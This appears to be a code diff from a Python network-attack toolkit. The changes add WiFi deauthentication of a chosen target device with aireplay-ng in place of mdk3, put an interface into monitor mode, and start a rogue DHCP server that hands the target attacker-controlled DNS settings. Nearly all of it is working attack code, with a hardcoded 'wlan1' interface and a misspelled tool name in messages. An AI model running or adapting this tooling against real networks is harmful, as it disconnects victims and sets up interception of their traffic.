@@ -95,6 +95,8 @@ last_ip = Base.get_netiface_last_ip(listen_network_interface)
 # endregion
 
 # region Get network interface for send wifi deauth packets, get wifi settings from listen network interface
+if args.deauth_iface is not None:
+    args.deauth = True
 
 if args.deauth:
     # region Get network interface for send wifi deauth packets
@@ -187,14 +189,21 @@ if __name__ == "__main__":
         Base.print_info("Set Monitor mode on interface: ", deauth_network_interface, " ...")
         try:
             sub.Popen(['ifconfig ' + deauth_network_interface + ' down'], shell=True, stdout=sub.PIPE)
-            sub.Popen(['iwconfig ' + deauth_network_interface + ' mode monitor'], shell=True, stdout=sub.PIPE)
-            wireless_settings = sub.Popen(['iwconfig ' + deauth_network_interface], shell=True, stdout=sub.PIPE)
+            sub.Popen(['iwconfig ' + deauth_network_interface + ' mode monitor >/dev/null 2>&1'],
+                      shell=True, stdout=sub.PIPE)
+
+            sleep(3)
+            wireless_settings = sub.Popen(['iwconfig ' + deauth_network_interface],
+                                          shell=True, stdout=sub.PIPE, stderr=sub.PIPE)
             wireless_settings_out, wireless_settings_error = wireless_settings.communicate()
 
             if wireless_settings_out.find("Mode:Monitor") == -1:
-                Base.print_error("Could not set Monitor mode on interface: ", deauth_network_interface)
-                exit(1)
+                if wireless_settings_out.find("Mode:Auto") == -1:
+                    Base.print_error("Could not set Monitor mode on interface: ", deauth_network_interface)
+                    exit(1)
 
+            sub.Popen(['iwconfig ' + deauth_network_interface + ' channel ' + channel + ' >/dev/null 2>&1'],
+                      shell=True, stdout=sub.PIPE)
             sub.Popen(['ifconfig ' + deauth_network_interface + ' up'], shell=True, stdout=sub.PIPE)
         except OSError as e:
             if e.errno == errno.ENOENT:
@@ -286,7 +295,7 @@ if __name__ == "__main__":
     try:
         makedirs(redirect_path)
     except OSError:
-        Base.print_info("Path: ", redirect_path, " already exist.")
+        Base.print_info("Path: ", redirect_path, " already exist")
     except:
         Base.print_error("Something else went wrong while trying to create path: ", redirect_path)
         exit(1)
@@ -393,23 +402,24 @@ if __name__ == "__main__":
         # endregion
 
         # region Set new IP address for target
-        if args.new_ip is None:
+        if not args.deauth:
+            if args.new_ip is None:
 
-            # region Fast scan localnet with arp-scan
-            Base.print_info("Search for free IP addresses on the local network ...")
-            localnet_ip_addresses = Scanner.find_ip_in_local_network(listen_network_interface)
-            # endregion
+                # region Fast scan localnet with arp-scan
+                Base.print_info("Search for free IP addresses on the local network ...")
+                localnet_ip_addresses = Scanner.find_ip_in_local_network(listen_network_interface)
+                # endregion
 
-            index = 0
-            while new_ip is None:
-                check_ip = str(IPv4Address(unicode(first_ip)) + index)
-                if check_ip not in localnet_ip_addresses:
-                    new_ip = check_ip
-                else:
-                    index += 1
-            index = 0
+                index = 0
+                while new_ip is None:
+                    check_ip = str(IPv4Address(unicode(first_ip)) + index)
+                    if check_ip not in localnet_ip_addresses:
+                        new_ip = check_ip
+                    else:
+                        index += 1
+                index = 0
 
-        Base.print_info("Target new ip: ", new_ip)
+            Base.print_info("Target new ip: ", new_ip)
         # endregion
 
         # region Run apple_rogue_dhcp and network_conflict_creator scripts
@@ -433,30 +443,29 @@ if __name__ == "__main__":
                     exit(2)
         # endregion
 
-        # region Run dhcp_rogue_server script and mdk3 for send deauth packets to Target
+        # region Run dhcp_rogue_server script and aireply-ng for send deauth packets to Target
         if args.deauth:
             try:
+                # Start dhcp_rogue_server.py script as process
                 sub.Popen(['python ' + script_dir + '/Scripts/DHCP/dhcp_rogue_server.py -i ' +
                            listen_network_interface + ' -t ' + target_mac_address + ' -T ' + target_ip_address +
                            ' --dnsop --exit --quiet &'],
                           shell=True)
                 sleep(3)
 
-                # Write target MAC address to blacklist file for mdk3
-                blacklist_file_name = "/tmp/blacklist.txt"
-                with open(blacklist_file_name, 'w') as blacklist_file:
-                    blacklist_file.write(target_mac_address + '\n')
+                # Send wifi deauth packets
+                Base.print_info("WiFi deauth packets is sending ...")
+                sub.Popen(['aireplay-ng wlan1 -0 25 -a ' + bssid + ' -c ' + target_mac_address +
+                           ' >/dev/null 2>&1'], shell=True)
+                Base.print_info("All WiFi deauth packets sent")
 
-                # Start mdk3 process with timeout 5 sec.
-                sub.Popen(['timeout 10 mdk3 ' + deauth_network_interface + ' -c ' + channel +
-                           ' -b ' + blacklist_file_name + ' >/dev/null 2>&1'], shell=True)
             except OSError as e:
                 if e.errno == errno.ENOENT:
-                    Base.print_error("Program: ", "python", " or ", "mdk3", " is not installed!")
+                    Base.print_error("Program: ", "python", " or ", "aireply-ng", " is not installed!")
                     exit(1)
                 else:
                     Base.print_error("Something else went wrong while trying to run ",
-                                     "`dhcp_rogue_server.py`", " or ", "`mdk3`")
+                                     "`dhcp_rogue_server.py`", " or ", "`aireply-ng`")
                     exit(2)
         # endregion
 
